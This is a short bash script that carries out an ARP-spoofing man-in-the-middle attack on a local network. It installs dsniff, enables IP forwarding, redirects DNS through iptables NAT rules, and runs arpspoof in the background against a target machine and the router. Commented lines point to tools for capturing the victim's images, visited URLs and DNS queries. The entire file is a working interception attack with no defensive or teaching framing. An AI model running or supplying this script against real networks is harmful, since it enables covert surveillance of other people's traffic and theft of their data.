# Setting up IPs
interface=eth0; router=10.0.0.1; target=10.0.0.5; myip=10.0.0.2; dnsip=8.8.4.4;

echo "Checking software";
myapp=dsniff; if [ -z "$(command -v ${myapp})" ]; then apt install ${myapp}; fi;

echo "Setting up forwarding";
echo "1" > /proc/sys/net/ipv4/ip_forward; sysctl -w net.ipv4.ip_forward=1;
iptables -I FORWARD 1 -i ${interface} -j ACCEPT;

echo "Setting up dns";
iptables -I INPUT 1 -p tcp -s ${target}/32 --dport 53 -j ACCEPT;
iptables -I INPUT 1 -p udp -s ${target}/32 --dport 53 -j ACCEPT;
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination ${dnsip}:53;
iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination ${dnsip}:53;
iptables -t nat -A POSTROUTING -p udp --dport 53 -j SNAT --to-source ${myip};
iptables -t nat -A POSTROUTING -p tcp --dport 53 -j SNAT --to-source ${myip};

echo "Running";
arpspoof -i ${interface} -t ${target} ${router} >> /dev/null 2>&1 & disown
arpspoof -i ${interface} -t ${router} ${target} >> /dev/null 2>&1 & disown

# Sniff images # driftnet -i ${interface}
# Sniff URL traffic # urlsnarf -i ${interface}
# Also # iftop or tcpdump -np port 53

# Disable forwarding
# echo "0" > /proc/sys/net/ipv4/ip_forward; sysctl -w net.ipv4.ip_forward=0;
